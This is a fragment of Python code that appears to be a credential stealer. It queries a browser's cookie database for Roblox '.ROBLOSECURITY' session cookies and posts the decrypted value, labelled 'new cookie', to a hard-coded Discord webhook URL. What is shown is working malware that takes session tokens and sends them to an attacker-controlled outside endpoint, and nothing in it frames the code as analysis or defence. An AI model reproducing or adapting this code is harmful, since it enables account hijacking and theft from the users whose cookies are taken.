...
WHERE host_key like '%roblox.com%' AND name like '%ROBLOSECURITY%'""")
    ...
    urll = f"https://ptb.discord.com/api/webhooks/964477768601567294/2Wi3lyDvD7DZ93ikQk9s9zmpsRk0Rho6BtXauf-pJbq5VswwnFwQ-otlP75Ih1gmbIyz"
    webhook = DiscordWebhook(url= urll)
    embed = DiscordEmbed(title="cockie", description=f"new cookie^ {decrypted_value}")
    embed.set_timestamp()
